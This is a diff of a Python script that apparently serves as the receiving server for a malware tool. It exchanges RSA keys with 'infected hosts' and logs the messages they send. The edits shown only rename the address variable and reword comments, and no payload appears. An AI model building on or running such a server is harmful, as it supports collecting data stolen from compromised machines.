@@ -15,9 +15,9 @@ Can be frozen using PyInstaller to run without requirement for python installati
 Written on 16th June 2020 by mowe (jcartermcfc@gmail.com)
 """
 
-
-logdir_path = "logs" # Modify this to suit your liking
-HOST_ADDR = ("192.168.0.14", 80) # Own fixed IP address
+logdir_path = "logs" # modify this to suit your liking
+SERVER_ADDR = ("192.168.0.14", 80) # replace this with your own server IP and desired port
+                                   # note port 80 is the HTTP port, so may be suitable
 
 class Packet:
     def __init__(self):
@@ -48,7 +48,7 @@ def write_msg_to_file(msg, addr, client_log_dir):
     return
     
 """
-Upon receiving request for key by infected host, generates public key and sends public key (in byte format) to host.
+Upon receiving request for RSA key by infected host, generates public key and sends public key (in byte format) to host.
 Returns private key to main loop so it can be used for decryption.
 """
 def handle_key_request(clientsock):
@@ -128,8 +128,8 @@ def main():
 
     tcp_host = socket.socket(socket.AF_INET, socket.SOCK_STREAM) # create TCP socket
 
-    print("server started, waiting for clients on", HOST_ADDR)
-    tcp_host.bind(HOST_ADDR) # bind TCP socket
+    print("server started, waiting for clients on", SERVER_ADDR)
+    tcp_host.bind(SERVER_ADDR) # bind TCP socket
     tcp_host.listen(5) # listen for connections
     print("listening...")
 
